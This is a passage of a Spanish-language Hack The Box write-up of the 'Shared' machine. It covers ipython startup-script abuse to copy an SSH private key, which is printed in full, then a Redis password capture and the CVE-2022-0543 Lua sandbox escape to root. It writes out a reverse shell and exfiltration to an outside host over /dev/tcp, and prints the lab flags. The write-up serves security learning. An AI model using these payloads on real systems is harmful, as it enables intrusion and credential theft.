    <p>Esta usando <code class="language-plaintext highlighter-rouge">ipython</code> y se mete ala ruta donde estábamos <a href="https://es.wikipedia.org/wiki/IPython">https://es.wikipedia.org/wiki/IPython</a>.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/shared/17.png" />
</p>

<ul>
  <li>
    <p>Si investigamos encontramos como podemos abusar de <code class="language-plaintext highlighter-rouge">ipython</code> <a href="https://github.com/ipython/ipython/security/advisories/GHSA-pq7m-3gw7-gq5x">https://github.com/ipython/ipython/security/advisories/GHSA-pq7m-3gw7-gq5x</a>.</p>
  </li>
  <li>
    <p>Vamos a seguir el <code class="language-plaintext highlighter-rouge">Proof of concept</code> primeros vamos a crearnos un directorio después dentro del directorio <code class="language-plaintext highlighter-rouge">profile_default</code> crea otro directorio con el nombre <code class="language-plaintext highlighter-rouge">startup</code> y después crea un <code class="language-plaintext highlighter-rouge">script</code> con nombre <code class="language-plaintext highlighter-rouge">foo.py</code> y le mete contenido y podemos decirle que como el usuario que queremos convertirnos esta corriendo el proceso pues que cuando se inicie se ejecuta el script y nos de clave <code class="language-plaintext highlighter-rouge">id_rsa</code> y no la ponga en una ruta del sistema para poder conectarnos por <code class="language-plaintext highlighter-rouge">SSH</code> con ese usuario.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>james_mason@shared:/opt/scripts_review<span class="nv">$ </span><span class="nb">mkdir</span> <span class="nt">-m</span> 777 profile_default <span class="o">&amp;&amp;</span> <span class="nb">mkdir</span> <span class="nt">-m</span> 777 profile_default/startup <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="s1">'import os; os.system("cat ~/.ssh/id_rsa &gt; /dev/shm/key")'</span> <span class="o">&gt;</span> profile_default/startup/foo.py
</code></pre></div></div>

<ul>
  <li>Ahora vamos a esperar que se ejecute la tarea para ver la <code class="language-plaintext highlighter-rouge">id_rsa</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>james_mason@shared:/opt/scripts_review<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span> /dev/shm/<span class="p">;</span> <span class="nb">cat </span>key
total 3036
<span class="nt">-rw-r--r--</span> 1 dan_smith   dan_smith      2602 May 26 16:22 key
<span class="nt">-rwxr-xr-x</span> 1 james_mason james_mason 3104768 May 26 15:54 pspy64
<span class="nb">cat</span>: key: No such file or directory
james_mason@shared:/opt/scripts_review<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span> /dev/shm/<span class="p">;</span> <span class="nb">cat</span> /dev/shm/key
james_mason@shared:/opt/scripts_review<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span> /dev/shm/<span class="p">;</span> <span class="nb">cat</span> /dev/shm/key
total 3036
<span class="nt">-rw-r--r--</span> 1 dan_smith   dan_smith      2602 May 26 16:22 key
<span class="nt">-rwxr-xr-x</span> 1 james_mason james_mason 3104768 May 26 15:54 pspy64
<span class="nt">-----BEGIN</span> OPENSSH PRIVATE KEY-----
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
<span class="nv">tfJMvuTgb3NhHvUwAAAAtyb290QHNoYXJlZAECAwQFBg</span><span class="o">==</span>
<span class="nt">-----END</span> OPENSSH PRIVATE KEY-----
</code></pre></div></div>

<h2 id="shell-as-dan_smith">Shell as dan_smith</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content nano id_rsa
➜  content <span class="nb">chmod </span>600 id_rsa
➜  content ssh <span class="nt">-i</span> id_rsa dan_smith@10.10.11.172
Linux shared 5.10.0-16-amd64 <span class="c">#1 SMP Debian 5.10.127-1 (2022-06-30) x86_64</span>

The programs included with the Debian GNU/Linux system are free software<span class="p">;</span>
the exact distribution terms <span class="k">for </span>each program are described <span class="k">in </span>the
individual files <span class="k">in</span> /usr/share/doc/<span class="k">*</span>/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Jul 14 14:43:34 2022 from 10.10.14.4
dan_smith@shared:~<span class="err">$</span>
</code></pre></div></div>

<h2 id="user-flag">User flag</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dan_smith@shared:~<span class="nv">$ </span><span class="nb">cat </span>user.txt
24a48911a42a2b121474cc933cdc48db
dan_smith@shared:~<span class="err">$</span>
</code></pre></div></div>

<h2 id="escalada-de-privilegios">Escalada de privilegios</h2>

<ul>
  <li>Estamos en el grupo <code class="language-plaintext highlighter-rouge">sysadmin</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dan_smith@shared:~<span class="nv">$ </span><span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>dan_smith<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1002<span class="o">(</span>dan_smith<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1002<span class="o">(</span>dan_smith<span class="o">)</span>,1001<span class="o">(</span>developer<span class="o">)</span>,1003<span class="o">(</span>sysadmin<span class="o">)</span>
dan_smith@shared:~<span class="err">$</span>
</code></pre></div></div>

<ul>
  <li>Vamos a ver archivos donde el grupo sea para <code class="language-plaintext highlighter-rouge">sysadmin</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dan_smith@shared:~<span class="nv">$ </span>find / <span class="nt">-group</span> sysadmin 2&gt;/dev/null
/usr/local/bin/redis_connector_dev
dan_smith@shared:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span> /usr/local/bin/redis_connector_dev
<span class="nt">-rwxr-x---</span> 1 root sysadmin 5974154 Mar 20  2022 /usr/local/bin/redis_connector_dev
dan_smith@shared:~<span class="err">$</span>
</code></pre></div></div>

<ul>
  <li>Y es un binario.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dan_smith@shared:/usr/local/bin<span class="nv">$ </span>file redis_connector_dev
redis_connector_dev: ELF 64-bit LSB executable, x86-64, version 1 <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, Go <span class="nv">BuildID</span><span class="o">=</span>sdGIDsCGb51jonJ_67fq/_JkvEmzwH9g6f0vQYeDG/iH1iXHhyzaDZJ056wX9s/7UVi3T2i2LVCU8nXlHgr, not stripped
</code></pre></div></div>

<ul>
  <li>Si lo ejecutamos vemos esto <a href="https://aws.amazon.com/es/elasticache/what-is-redis/">https://aws.amazon.com/es/elasticache/what-is-redis/</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dan_smith@shared:/usr/local/bin<span class="nv">$ </span>./redis_connector_dev
<span class="o">[</span>+] Logging to redis instance using password...

INFO <span class="nb">command </span>result:
<span class="c"># Server</span>
redis_version:6.0.15
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:4610f4c3acf7fb25
redis_mode:standalone
os:Linux 5.10.0-16-amd64 x86_64
arch_bits:64
multiplexing_api:epoll
atomicvar_api:atomic-builtin
gcc_version:10.2.1
process_id:3239
run_id:4450568378af75bfe290423a2b40a410f84df22d
tcp_port:6379
uptime_in_seconds:3
uptime_in_days:0
hz:10
configured_hz:10
lru_clock:5479317
executable:/usr/bin/redis-server
config_file:/etc/redis/redis.conf
io_threads_active:0
 &lt;nil&gt;
</code></pre></div></div>

<ul>
  <li>Si escribimos <code class="language-plaintext highlighter-rouge">redis</code> y tabulamos vemos varios <code class="language-plaintext highlighter-rouge">redis</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dan_smith@shared:~<span class="nv">$ </span>redis
redis-benchmark      redis-check-aof      redis-check-rdb      redis-cli            redis_connector_dev  redis-server
dan_smith@shared:~<span class="nv">$ </span>redis
</code></pre></div></div>

<ul>
  <li>
    <p>Aquí nos dicen como podemos enumerar <code class="language-plaintext highlighter-rouge">redis</code> <a href="https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis">https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis</a>.</p>
  </li>
  <li>
    <p>Nos conectamos pero no podemos ver información.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dan_smith@shared:~<span class="nv">$ </span>redis-cli
127.0.0.1:6379&gt; INFO
NOAUTH Authentication required.
127.0.0.1:6379&gt;
</code></pre></div></div>

<ul>
  <li>Si probamos con las credenciales que tenemos no funcionan.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>127.0.0.1:6379&gt; AUTH james_mason Soleil101
<span class="o">(</span>error<span class="o">)</span> WRONGPASS invalid username-password pair
127.0.0.1:6379&gt;
</code></pre></div></div>

<ul>
  <li>Para hacer pruebas desde nuestro entorno de atacante vamos a mandarnos el binario.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dan_smith@shared:~<span class="nv">$ </span><span class="nb">cat</span> &lt; /usr/local/bin/redis_connector_dev <span class="o">&gt;</span> /dev/tcp/10.10.14.55/443
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content nc <span class="nt">-nlvp</span> 443 <span class="o">&gt;</span> redis_connector_dev
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>10.10.14.55] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.172] 51872
</code></pre></div></div>

<ul>
  <li>Vamos a ejecutarlo.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">chmod</span> +x redis_connector_dev
➜  content ./redis_connector_dev
<span class="o">[</span>+] Logging to redis instance using password...

INFO <span class="nb">command </span>result:
 dial tcp <span class="o">[</span>::1]:6379: connect: connection refused
</code></pre></div></div>

<ul>
  <li>El error básicamente es que no hay conexión con el puerto en escucha entonces nos vamos a poner en escucha en ese puerto para ver que nos llega.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content ./redis_connector_dev
<span class="o">[</span>+] Logging to redis instance using password...

INFO <span class="nb">command </span>result:
</code></pre></div></div>

<ul>
  <li>Ahora podemos ver la contraseña.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  ~ nc <span class="nt">-nlvp</span> 6379
listening on <span class="o">[</span>any] 6379 ...
connect to <span class="o">[</span>127.0.0.1] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>127.0.0.1] 55836
<span class="k">*</span>2
<span class="nv">$4</span>
auth
<span class="nv">$16</span>
<span class="nv">F2WHqJUz2WEz</span><span class="o">=</span>Gqq
</code></pre></div></div>

<ul>
  <li>Como tenemos la contraseña ya nos podemos autenticar.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dan_smith@shared:~<span class="nv">$ </span>redis-cli
127.0.0.1:6379&gt; AUTH <span class="nv">F2WHqJUz2WEz</span><span class="o">=</span>Gqq
OK
127.0.0.1:6379&gt; INFO
<span class="c"># Server</span>
redis_version:6.0.15
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:4610f4c3acf7fb25
redis_mode:standalone
os:Linux 5.10.0-16-amd64 x86_64
arch_bits:64
multiplexing_api:epoll
atomicvar_api:atomic-builtin
gcc_version:10.2.1
process_id:3445
run_id:4d12a99f866d54b324c8dfa89c18f417d25a6fe8
tcp_port:6379
uptime_in_seconds:16
uptime_in_days:0
hz:10
configured_hz:10
lru_clock:5479871
executable:/usr/bin/redis-server
config_file:/etc/redis/redis.conf
io_threads_active:0

<span class="c"># Clients</span>
connected_clients:1
client_recent_max_input_buffer:8
client_recent_max_output_buffer:0
blocked_clients:0
tracking_clients:0
clients_in_timeout_table:0

<span class="c"># Memory</span>
used_memory:873328
used_memory_human:852.86K
used_memory_rss:15282176
used_memory_rss_human:14.57M
used_memory_peak:873328
used_memory_peak_human:852.86K
used_memory_peak_perc:100.17%
used_memory_overhead:830336
used_memory_startup:809832
used_memory_dataset:42992
used_memory_dataset_perc:67.71%
allocator_allocated:1287608
allocator_active:1605632
allocator_resident:4182016
total_system_memory:2078982144
total_system_memory_human:1.94G
used_memory_lua:41984
used_memory_lua_human:41.00K
used_memory_scripts:0
used_memory_scripts_human:0B
number_of_cached_scripts:0
maxmemory:0
maxmemory_human:0B
maxmemory_policy:noeviction
allocator_frag_ratio:1.25
allocator_frag_bytes:318024
allocator_rss_ratio:2.60
allocator_rss_bytes:2576384
rss_overhead_ratio:3.65
rss_overhead_bytes:11100160
mem_fragmentation_ratio:18.39
mem_fragmentation_bytes:14451360
mem_not_counted_for_evict:0
mem_replication_backlog:0
mem_clients_slaves:0
mem_clients_normal:20504
mem_aof_buffer:0
mem_allocator:jemalloc-5.2.1
active_defrag_running:0
lazyfree_pending_objects:0

<span class="c"># Persistence</span>
loading:0
rdb_changes_since_last_save:0
rdb_bgsave_in_progress:0
rdb_last_save_time:1716755887
rdb_last_bgsave_status:ok
rdb_last_bgsave_time_sec:-1
rdb_current_bgsave_time_sec:-1
rdb_last_cow_size:0
aof_enabled:0
aof_rewrite_in_progress:0
aof_rewrite_scheduled:0
aof_last_rewrite_time_sec:-1
aof_current_rewrite_time_sec:-1
aof_last_bgrewrite_status:ok
aof_last_write_status:ok
aof_last_cow_size:0
module_fork_in_progress:0
module_fork_last_cow_size:0

<span class="c"># Stats</span>
total_connections_received:1
total_commands_processed:1
instantaneous_ops_per_sec:0
total_net_input_bytes:68
total_net_output_bytes:39
instantaneous_input_kbps:0.00
instantaneous_output_kbps:0.00
rejected_connections:0
sync_full:0
sync_partial_ok:0
sync_partial_err:0
expired_keys:0
expired_stale_perc:0.00
expired_time_cap_reached_count:0
expire_cycle_cpu_milliseconds:0
evicted_keys:0
keyspace_hits:0
keyspace_misses:0
pubsub_channels:0
pubsub_patterns:0
latest_fork_usec:0
migrate_cached_sockets:0
slave_expires_tracked_keys:0
active_defrag_hits:0
active_defrag_misses:0
active_defrag_key_hits:0
active_defrag_key_misses:0
tracking_total_keys:0
tracking_total_items:0
tracking_total_prefixes:0
unexpected_error_replies:0
total_reads_processed:3
total_writes_processed:2
io_threaded_reads_processed:0
io_threaded_writes_processed:0

<span class="c"># Replication</span>
role:master
connected_slaves:0
master_replid:5785490148c587b8fd50f8a935ace659f1056459
master_replid2:0000000000000000000000000000000000000000
master_repl_offset:0
second_repl_offset:-1
repl_backlog_active:0
repl_backlog_size:1048576
repl_backlog_first_byte_offset:0
repl_backlog_histlen:0

<span class="c"># CPU</span>
used_cpu_sys:0.016155
used_cpu_user:0.047905
used_cpu_sys_children:0.000000
used_cpu_user_children:0.000000

<span class="c"># Modules</span>

<span class="c"># Cluster</span>
cluster_enabled:0

<span class="c"># Keyspace</span>
127.0.0.1:6379&gt;
</code></pre></div></div>

<ul>
  <li>Si buscamos alguna forma de elevar privilegios encontramos lo siguiente <a href="https://thesecmaster.com/blog/how-to-fix-cve-2022-0543-a-critical-lua-sandbox-escape-vulnerability-in-redis">https://thesecmaster.com/blog/how-to-fix-cve-2022-0543-a-critical-lua-sandbox-escape-vulnerability-in-redis</a>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/shared/18.png" />
</p>

<ul>
  <li>Si hacemos un <code class="language-plaintext highlighter-rouge">whoami</code> vemos que funciona.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dan_smith@shared:~<span class="nv">$ </span>redis-cli
127.0.0.1:6379&gt; AUTH <span class="nv">F2WHqJUz2WEz</span><span class="o">=</span>Gqq
OK
127.0.0.1:6379&gt; <span class="nb">eval</span> <span class="s1">'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("whoami", "r"); local res = f:read("*a"); f:close(); return res'</span> 0
<span class="s2">"root</span><span class="se">\n</span><span class="s2">"</span>
127.0.0.1:6379&gt;
</code></pre></div></div>

<ul>
  <li>Bueno como podemos ejecutar comandos vamos a enviarnos una <code class="language-plaintext highlighter-rouge">reverse shell</code> como el usuario <code class="language-plaintext highlighter-rouge">root</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dan_smith@shared:/dev/shm<span class="nv">$ </span><span class="nb">cat </span>reverse
<span class="c">#!/bin/bash</span>

bash <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/10.10.14.55/443 0&gt;&amp;1
</code></pre></div></div>

<ul>
  <li>Nos ponemos en escucha.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  ~ nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
</code></pre></div></div>

<ul>
  <li>Nos enviamos la shell.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dan_smith@shared:/dev/shm<span class="nv">$ </span>redis-cli
127.0.0.1:6379&gt; AUTH <span class="nv">F2WHqJUz2WEz</span><span class="o">=</span>Gqq
OK
127.0.0.1:6379&gt; <span class="nb">eval</span> <span class="s1">'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("bash /dev/shm/reverse", "r"); local res = f:read("*a"); f:close(); return res'</span> 0
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  ~ nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>10.10.14.55] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.172] 50994
bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>3619<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
bash: no job control <span class="k">in </span>this shell
root@shared:/var/lib/redis#
</code></pre></div></div>

<h2 id="roottxt">Root.txt</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@shared:/var/lib/redis# <span class="nb">cat</span> /root/root.txt
<span class="nb">cat</span> /root/root.txt
a5f9fb3e112adc4dd4e6650e64d240e1
</code></pre></div></div>

  </div><a class="u-url" href="/hackthebox/machines/hard/2024/05/26/shared.html" hidden></a>
</article>

      </div>
    </main><footer class="site-footer h-card">
  <data class="u-url" href="/"></data>

  <div class="wrapper">

    <div class="footer-col-wrapper">
      <div class="footer-col">
        <p class="feed-subscribe">
          <a href="http://localhost:4000/feed.xml">
            <svg class="svg-icon orange">
              <use xlink:href="/assets/minima-social-icons.svg#rss"></use>
            </svg><span>Subscribe</span>
          </a>
        </p>
        <ul class="contact-list">
          <li class="p-name">MiguelRega7</li>
          
        </ul>
      </div>
      <div class="footer-col">
        <p>Posts sobre resolución de CTFs y ciberseguridad.
</p>
      </div>
    </div>

    <div class="social-links"><ul class="social-media-list"><li>
  <a rel="me" href="https://github.com/MikeRega7" target="_blank" title="github">
    <svg class="svg-icon grey">
      <use xlink:href="/assets/minima-social-icons.svg#github"></use>
    </svg>
  </a>
</li>
<li>
  <a rel="me" href="https://www.instagram.com/_miguelitornuno7" target="_blank" title="instagram">
    <svg class="svg-icon grey">
      <use xlink:href="/assets/minima-social-icons.svg#instagram"></use>
    </svg>
  </a>
</li>
<li>
  <a rel="me" href="https://www.linkedin.com/in/juan-miguel-regalado-nu%C3%B1o-a3b14b278" target="_blank" title="linkedin">
    <svg class="svg-icon grey">
      <use xlink:href="/assets/minima-social-icons.svg#linkedin"></use>
    </svg>
  </a>
</li>
<li>
  <a rel="me" href="https://twitter.com/MiguelJmrn7" target="_blank" title="twitter">
    <svg class="svg-icon grey">
      <use xlink:href="/assets/minima-social-icons.svg#twitter"></use>
    </svg>
  </a>
</li>
</ul>
</div>

  </div>

</footer>
</body>

</html>
